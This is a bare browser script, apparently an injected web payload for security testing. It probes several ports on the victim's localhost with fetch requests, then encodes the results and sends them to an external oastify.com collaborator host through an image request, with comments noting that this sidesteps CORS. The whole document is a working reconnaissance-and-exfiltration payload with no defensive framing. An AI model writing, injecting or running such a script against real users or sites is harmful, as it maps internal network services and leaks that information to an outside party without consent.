<script>const ports = [80, 8086,6066];
const results = [];

const requests = ports.map(port => {
    const url = `http://127.0.0.1:${port}`;
    return fetch(url, {
        method: 'GET',
        credentials: 'omit' // CORS credentials set to false
    })
    .then(response => {
        const result = response.ok ? `Success on port ${port}` : `Error on port ${port}: ${response.status}`;
        console.log(result);
        results.push(result);
    })
    .catch(error => {
        const result = `Failed to connect to port ${port}: ${error}`;
        console.log(result);
        results.push(result);
    });
});

Promise.all(requests).then(() => {
    const report = encodeURIComponent(JSON.stringify({
        timestamp: new Date().toISOString(),
        results
    }));

    // Create an image to send data without CORS
    const img = new Image();
    img.src = `https://z44fyopxmk8h0e4zv5t368syqpwgka8z.oastify.com/?report=${report}`;
    console.log('Report sent without CORS');
});</script>
